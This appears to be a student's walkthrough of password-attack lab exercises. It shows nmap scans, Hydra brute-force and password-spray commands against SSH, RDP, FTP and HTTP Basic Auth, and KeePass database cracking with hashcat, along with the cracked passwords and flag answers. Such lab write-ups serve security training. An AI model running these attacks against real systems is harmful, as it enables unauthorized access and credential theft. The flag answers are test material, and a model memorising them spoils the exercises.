

# 15.1.1 Network Services


1. Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the _george_ user's home directory.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.201
	PORT     STATE SERVICE
	22/tcp   open  ssh
	2222/tcp open  EtherNetIP-1

sudo nmap -sV 192.168.241.201
	PORT     STATE SERVICE VERSION
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Use hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
	[2222][ssh] host: 192.168.241.201   login: george   password: chocolate

# Login
ssh george@192.168.241.201 -p 2222
	password:   chocolate
```

> Answer:  OS{5042809f26d448f022f68490b351794d}



2. Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames _justin_ and _daniel_.

```bash
# Enumerate
sudo -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Password spray attack
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.241.202
	[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
	[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#

# Login
rdesktop 192.168.241.202 -u justin -p SuperS3cure1337#
```

> Answer:  OS{6527425c127b4b1f5938d30c9187ecff}



3. Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the _itadmin_ user and find the flag.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Attack
hydra ftp://192.168.241.202 -l itadmin -P /usr/share/wordlists/rockyou.txt
	[21][ftp] host: 192.168.241.202   login: itadmin   password: hellokitty

# Connect to ftp
ftp 192.168.241.202                                                             
	Connected to 192.168.241.202.
	220-FileZilla Server 1.4.1
	220 Please visit https://filezilla-project.org/
Name (192.168.241.202:kali): itadmin
	331 Please, specify the password.
Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
ftp> ls
	229 Entering Extended Passive Mode (|||52238|)
	150 Starting data transfer.
	-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
	-rw-rw-rw- 1 ftp ftp              38 Mar 30 06:01 flag.txt
	226 Operation successful
ftp> get flag.txt
ftp> exit

cat flag.txt
```

> Answer:  OS{df4abd9eb8e51b1ce81dcbc9635535d4}


# 15.1.2 HTTP Post

2. The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user _admin_. Once you have identified the correct password, enter it as answer to this exercise.

```bash
# Enumerate
sudo nmap -Pn 192.168.227.201
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 61
	80/tcp open  http    syn-ack ttl 60
```

- Open Burp and turn proxy on
- Navigate to site
- Login user:pass
- Take note of request body and failed login identifier
![](15.1.2.2ex_http_invalid.png)

- As it's only a GET request, research how to use **hydra's** http-get for Basic Authentication
- https://notes.benheater.com/books/hydra/page/brute-force-http-basic-authentication-with-hydra
```bash
hydra -U http-get
	Help for module http-get:
	============================================================================
	Module http-get requires the page to authenticate.
	The following parameters are optional:
	 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
	 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
	 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
	       valid account has been found, F= means if this string is present the
	       combination is invalid. Note: this must be the last option supplied.
	For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

- Craft attack
```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt "http-get://192.168.227.201:80/:A=BASIC:F=401"
	[80][http-get] host: 192.168.227.201   login: admin   password: 789456]
```

> Answer:  789456



# 15.2.4 Password Manager

2. Enumerate VM #2 and get access to the system as user _nadine_. Obtain the password stored as title "flag" in the password manager.
```bash
# Enumerate
sudo nmap -Pn -vv -n -p- 192.168.212.227 --max-scan-delay=0 
	PORT      STATE SERVICE       REASON
	135/tcp   open  msrpc         syn-ack ttl 125
	139/tcp   open  netbios-ssn   syn-ack ttl 125
	445/tcp   open  microsoft-ds  syn-ack ttl 125
	3389/tcp  open  ms-wbt-server syn-ack ttl 125
	5040/tcp  open  unknown       syn-ack ttl 125
	49664/tcp open  unknown       syn-ack ttl 125
	49665/tcp open  unknown       syn-ack ttl 125
	49666/tcp open  unknown       syn-ack ttl 125
	49667/tcp open  unknown       syn-ack ttl 125
	49668/tcp open  unknown       syn-ack ttl 125
	49669/tcp open  unknown       syn-ack ttl 125
	49670/tcp open  unknown       syn-ack ttl 125
	49671/tcp open  unknown       syn-ack ttl 125

sudo nmap -sCV -p 135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,49671 192.168.212.227
	PORT      STATE SERVICE            VERSION
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3389/tcp  open  ssl/ms-wbt-server?
	| rdp-ntlm-info: 
	|   Target_Name: MARKETINGWK02
	|   NetBIOS_Domain_Name: MARKETINGWK02
	|   NetBIOS_Computer_Name: MARKETINGWK02
	|   DNS_Domain_Name: marketingwk02
	|   DNS_Computer_Name: marketingwk02
	|   Product_Version: 10.0.22000
	|_  System_Time: 2024-04-01T22:19:08+00:00
	|_ssl-date: 2024-04-01T22:19:23+00:00; +1s from scanner time.
	| ssl-cert: Subject: commonName=marketingwk02
	| Not valid before: 2024-03-31T22:09:20
	|_Not valid after:  2024-09-30T22:09:20
	5040/tcp  open  unknown
	49664/tcp open  msrpc              Microsoft Windows RPC
	49665/tcp open  msrpc              Microsoft Windows RPC
	49666/tcp open  msrpc              Microsoft Windows RPC
	49667/tcp open  msrpc              Microsoft Windows RPC
	49668/tcp open  msrpc              Microsoft Windows RPC
	49669/tcp open  msrpc              Microsoft Windows RPC
	49670/tcp open  msrpc              Microsoft Windows RPC
	49671/tcp open  msrpc              Microsoft Windows RPC
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2024-04-01T22:19:13
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
```

- Attack RDP
```bash
hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.212.227
	[3389][rdp] host: 192.168.212.227   login: nadine   password: 123abc

# Login
xfreerdp /cert-ignore /compression /auto-reconnect /u:nadine /p:123abc /v:192.168.212.227 /drive:test,/home/kali/exercises/ 
```

- Check for KeePass (it's there)
- Find DB file
```powershell
C:\>dir /s *.kdbx
	 Volume in drive C has no label.
	 Volume Serial Number is 1682-A2A3
	
	 Directory of C:\Users\nadine\Documents
	
	06/09/2022  10:39 AM             1,966 Database.kdbx
	               1 File(s)          1,966 bytes
	
	     Total Files Listed:
	               1 File(s)          1,966 bytes
	               0 Dir(s)   1,184,964,608 bytes free
```

- Transfer *Database.kdbx* file to Kali & crack
```bash
keepass2john Database.kdbx > keepass.hash

# Remove prepend of 'Database:'
vim keepass.hash

cat keepass.hash
	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56

# Crack
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
```

- Use `pinkpanther1234` for KeePass Master Password & get flag

> Answer:  `eSGJIzUp5nrr834QZBWK`



# 15.2.5 SSH Private Key Passphrase

